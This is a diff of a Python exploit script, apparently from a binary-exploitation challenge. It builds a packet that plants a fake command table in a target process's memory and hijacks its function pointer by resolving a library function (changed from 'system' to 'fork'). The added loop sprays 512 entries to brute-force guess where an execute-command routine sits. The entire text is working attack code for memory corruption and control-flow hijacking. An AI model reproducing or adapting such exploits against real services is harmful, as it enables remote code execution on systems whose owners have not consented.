@@ -124,10 +124,10 @@ pak = b''
 # write fake cmdtab to 0xb0000000
 a = 0xb0000000
 # pak += write_to_addr(a, 0xAAAAAAAA)  # opcode
-pak += write_to_addr(a, 2280059729)  # opcode execute_command
+pak += write_to_addr(a, 0x6b726f66)  # opcode execute_command
 pak += write_to_addr(a + 4, 0)  # flags
 pak += write_to_addr(a + 12, a)  # prev
-pak += write_to_addr(a + 16, 0)  # prev
+pak += write_to_addr(a + 16, a + 20)  # next, first guess for execute_command
 
 # get and write system as fp
 ## get fake cmdtab.fp address
@@ -138,7 +138,7 @@ pak += b'\xaf\x04\x00' + b'\x00\x00\x00\x00'
 pak += b'\x4d\x00\x00'
 
 ## get main
-s = b'system\0'
+s = b'fork\0'
 pak += b'\xea' + struct.pack('<H', len(s)) + s
 pak += b'\xb4\x00\x00'
 
@@ -158,6 +158,19 @@ pak += b'\xb4\x00\x00'
 # write address to cmdtab_head address
 pak += b'\xaf\x04\x00' + struct.pack('<I', a)
 pak += b'\xb0\x00\x00'
+
+# continue chain
+for i in range(512):
+    base = 0xb76ff000 + i * 0x1000
+    execmd_addr = base + 0x11c0
+    curr_cmdtab_addr = a + 20 + 20 * i
+
+    # write next cmd_tab
+    pak += write_to_addr(curr_cmdtab_addr, i)  # opcode execute_command
+    pak += write_to_addr(curr_cmdtab_addr + 4, 0)  # flags
+    pak += write_to_addr(curr_cmdtab_addr + 8, execmd_addr)  # fp
+    pak += write_to_addr(curr_cmdtab_addr + 12, curr_cmdtab_addr - 20)  # prev
+    pak += write_to_addr(curr_cmdtab_addr + 16, curr_cmdtab_addr + 20)  # next, first guess for execute_command
 
 # ok
 pak += b'\x70\x00\x00'
